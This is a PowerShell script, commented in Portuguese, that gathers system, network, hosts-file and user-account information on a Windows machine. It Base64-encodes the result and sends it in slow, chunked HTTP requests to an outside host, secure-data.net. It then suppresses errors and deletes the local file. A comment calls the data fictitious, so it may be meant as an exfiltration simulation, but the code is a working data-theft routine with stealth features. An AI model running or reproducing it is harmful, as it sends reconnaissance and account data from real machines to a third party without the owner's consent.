echo "##########################" > info.txt
echo "INFO SYSTEM" >> info.txt
echo "##########################" >> info.txt
systeminfo >> info.txt
Start-Sleep -Seconds 3
echo "" >> info.txt
echo "##########################" >> info.txt
echo "INFO NETWORK" >> info.txt
echo "##########################" >> info.txt
(ipconfig /all) >> info.txt
Start-Sleep -Seconds 1
echo "" >> info.txt
echo "##########################" >> info.txt
echo "INFO HOSTS" >> info.txt
echo "##########################" >> info.txt
type c:\Windows\System32\drivers\etc\hosts >> info.txt
Start-Sleep -Seconds 1
echo "" >> info.txt
echo "##########################" >> info.txt
echo "INFO USERS" >> info.txt
echo "##########################" >> info.txt
net user >> info.txt
Start-Sleep -Seconds 1

# 1. Ler dados fictícios
$data = Get-Content "info.txt"

# 2. Converter para Base64
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
$base64 = [System.Convert]::ToBase64String($bytes)

# 3. Dividir em blocos de 40 caracteres
$chunks = ($base64 -split '(.{100})' | ? { $_ -ne "" })

# 4. Enviar cada bloco em uma requisição com pausa de 5 segundos
foreach ($chunk in $chunks) {
    try {
        Invoke-WebRequest -Uri "http://secure-data.net/api/upload?session=$chunk" -UseBasicParsing -ErrorAction Stop | Out-Null
    }
    catch {
        # Ignora qualquer erro de conexão
    }
    Start-Sleep -Seconds 5
}
del .\info.txt
